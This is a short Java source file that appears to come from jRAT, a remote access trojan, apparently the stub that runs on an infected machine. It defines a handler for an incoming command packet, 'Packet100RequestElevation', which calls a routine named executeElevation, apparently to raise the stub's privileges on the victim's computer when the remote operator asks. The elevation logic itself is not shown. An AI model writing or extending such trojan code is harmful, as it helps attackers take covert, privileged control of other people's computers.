package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.Elevation;

public class Packet100RequestElevation extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		Elevation.executeElevation();
	}

}
